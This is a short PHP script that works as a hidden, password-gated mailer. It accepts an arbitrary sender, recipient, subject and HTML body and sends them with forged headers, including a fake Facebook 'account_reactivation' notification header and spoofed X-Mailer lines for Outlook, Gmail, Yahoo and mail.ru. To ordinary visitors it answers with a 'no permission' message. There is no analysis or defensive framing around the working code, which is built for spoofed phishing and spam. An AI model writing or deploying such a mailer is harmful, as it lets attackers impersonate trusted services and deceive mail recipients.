<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $postKay = filter_var($_POST['postKay'], FILTER_SANITIZE_STRING);
    $pass_post = 'sofa_php';
    $password =  sha1($pass_post);
    if ($postKay == $password) {
        $from   = $_POST['from'];
        $name   = $_POST['name'];
        $sub    = $_POST['sub'];
        $to     = $_POST['to'];
        $mes    = $_POST['mes'];
        // PHPMailer True
        $headers  = "MIME-Version: 1.0\n";
        //// Html Letter 
        $headers .= "Content-type: text/html; charset=iso-8859-1\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        //// PHPMailer True
                $headers .= "X-Mailer: PHP/" . phpversion();
                $headers .= "X-Facebook-Notify: account_reactivation; mailid=9ce6218G2dd50372G0G158G3452e4b1
                             X-FACEBOOK-PRIORITY: 0
                             X-Auto-Response-Suppress: All" . "\r\n";
                $headers .= "X-Mailer: Microsoft Office Outlook, Build 17.551210\n";
                $headers .= "X-Mailer: Gmail \n";
                $headers .= "X-Mailer: Yahoo \n";
                $headers .= "X-Mailer: mail.ru \n";
                $headers .= "From: " . adopt($name) . " <" . $from . ">" . PHP_EOL . "Reply-To: " . $from . "" . PHP_EOL;
        mail($to, adopt($sub), $mes, $headers);
        echo json_encode(['status' => 'dn']);
    } else {
        echo json_encode(['status' => 'kay Null']);
    }
} else {

    $msg = 'You do not have permission to view the content';
    echo json_encode(['code' => 'You do not have powers', 'Message' => $msg]);
    exit;
}


function adopt($text)
{
    return '=?UTF-8?B?' . Base64_encode($text) . '?=';
}
